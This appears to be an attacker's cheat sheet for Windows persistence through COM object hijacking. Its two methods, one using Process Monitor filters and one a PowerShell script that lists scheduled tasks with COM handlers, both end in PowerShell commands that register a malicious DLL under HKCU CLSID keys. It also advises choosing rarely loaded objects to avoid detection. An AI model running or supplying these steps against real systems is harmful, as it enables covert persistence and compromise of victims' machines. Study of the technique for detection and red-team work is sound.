Create persistence by hijacking COM objects where the instance of an application loads items that don't exist:

    Process Monitor:
        Step 1(attacker): Get procmon.exe from Sysinternals suite (https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
        Step 2(victim)  : Execute the binary and enter filter items:
                            Operation is RegOpenKey
                            Result is NAME NOT FOUND
                            Path ends with InprocServer32
        Step 3(victim)  : Look for COM objects that are loaded not too often to prevent detection, grab its CLSID
        Step 4(attacker): Create your malicious DLL and load it onto the victim's computer
        Step 5(victim)  : Add registry entries to complete the COM hijack (Powershell):
                            Step 1: New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{<CLSID>}"
                            Step 2: New-Item -Path "HKCU:Software\Classes\CLSID\{<CLSID>}" -Name "InprocServer32" -Value "<pathToMaliciousDLL>"
                            Step 3: New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLSID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"

    Task Scheduler:
       Step 1(victim): Look for COM objects in Task Scheduler with Powershell script below, grab the CLSID:
			$Tasks = Get-ScheduledTask

			foreach ($Task in $Tasks) {
				if ($Task.Actions.ClassId -ne $null) {
					if ($Task.Triggers.Enabled -eq $true) {
						if ($Task.Principal.GroupId -eq "Users") {
							Write-Host "Task Name: " $Task.TaskName
							Write-Host "Task Path: " $Task.TaskPath
							Write-Host "CLSID: " $Task.Actions.ClassId
							Write-Host
						}
					}
				}
			}

		Step 2(victim): Look up the implementation of the COM object in HKEY_CLASSES_ROOT\CLSID:
			Get-Item -Path "Registry::HKCR\CLSID\{<CLSID>}" | ft -AutoSize
			Get-ChildItem -Path "Registry::HKCR\CLSID\{<CLSID>}" | ft -AutoSize

		Step 3: Check if we can hijack with a duplicate entry if COM object is implemented only in HKLM and not HKCU:
			Get-Item -Path "HKLM:Software\Classes\CLSID\{<CLSID>}" | ft -AutoSize	-> valid result
			Get-Item -Path "HKCU:Software\Classes\CLSID\{<CLSID>}" | ft -AutoSize	-> no result

		Step 4: Hijack the COM object by writing a DUPLICATE ENTRY (so with the same attributes) in HKCU:
			 Step 1: New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{<CLSID>}"
             Step 2: New-Item -Path "HKCU:Software\Classes\CLSID\{<CLSID>}" -Name "InprocServer32" -Value "<pathToMaliciousDLL>"
             Step 3: New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLSID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"

			
